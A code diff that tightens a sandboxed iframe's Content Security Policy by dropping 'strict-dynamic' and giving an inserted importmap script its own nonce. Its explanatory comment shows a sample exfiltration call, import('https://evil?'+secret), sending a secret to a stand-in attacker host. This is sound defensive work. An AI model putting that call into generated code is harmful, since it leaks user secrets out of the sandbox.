@@ -36,10 +36,14 @@ const CSP_BASE = [
  */
 export function buildSrcdoc(reactRuntimeSrc?: string): string {
   const nonce = crypto.randomUUID().replace(/-/g, "");
-  // 'strict-dynamic' lets the nonced scripts propagate trust to any scripts
-  // they dynamically load (e.g. import() from blob: URLs created at runtime).
-  // blob: is kept for older browsers that don't support strict-dynamic fully.
-  const csp = `script-src 'nonce-${nonce}' 'strict-dynamic' blob:; ${CSP_BASE}`;
+  // No 'strict-dynamic': it lets trusted scripts dynamically load ANY script
+  // URL (allowlists are ignored), which is a data-exfil channel once generated
+  // (AI-written) code runs in the realm — import("https://evil?"+secret).
+  // All legitimate loading (React shim, host bundle, generated modules) is
+  // blob-URL import(), which the explicit blob: source keeps working. The
+  // dynamically created importmap script below carries its own nonce because
+  // strict-dynamic no longer propagates trust to inserted scripts.
+  const csp = `script-src 'nonce-${nonce}' blob:; ${CSP_BASE}`;
 
   let reactSetupScript = "";
   if (reactRuntimeSrc) {
@@ -54,6 +58,8 @@ export function buildSrcdoc(reactRuntimeSrc?: string): string {
       `window.__FLOWLET_REACT_URL=_u;` +
       `var _im=document.createElement('script');` +
       `_im.type='importmap';` +
+      // Without 'strict-dynamic' this inserted script needs its own nonce.
+      `_im.nonce=${JSON.stringify(nonce)};` +
       `_im.textContent=JSON.stringify({imports:{` +
       `"react":_u,` +
       `"react-dom":_u,` +
